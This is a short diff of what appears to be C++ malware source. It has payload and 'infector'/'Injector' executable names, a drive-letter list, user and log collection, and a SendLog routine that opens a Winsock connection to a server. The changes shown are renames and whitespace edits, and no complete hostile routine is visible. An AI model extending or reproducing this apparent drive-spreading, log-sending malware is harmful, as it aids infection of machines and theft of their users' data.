@@ -18,8 +18,8 @@ const char *drive[]={
     "y:", "z:", 0
 };
 
-const char payload[MAX_PATH]="\\test.exe";
-const char infector[MAX_PATH]="\\infector.exe";
+const char payload[MAX_PATH]="\\Payload.exe";
+const char infector[MAX_PATH]="\\Injector.exe";
 
 
 char* GetUser() {
@@ -43,12 +43,8 @@ void CreateLog() {
     return;
 }
 
-
 void LOG(string input, char* logFile) {
     string filePath = string(logFile);
-
-    
-    
     fstream LogFile(filePath , fstream::app);
     //std::cout << "Halllo Ik copy nu hier!: " << logFile << std::endl;
     if (LogFile.is_open()) {
@@ -206,7 +202,7 @@ int SendLog() {
         return -1;
     }
     cerr << "Winsock initialized" << endl;
-
+    
     // Set up the server address
     struct sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
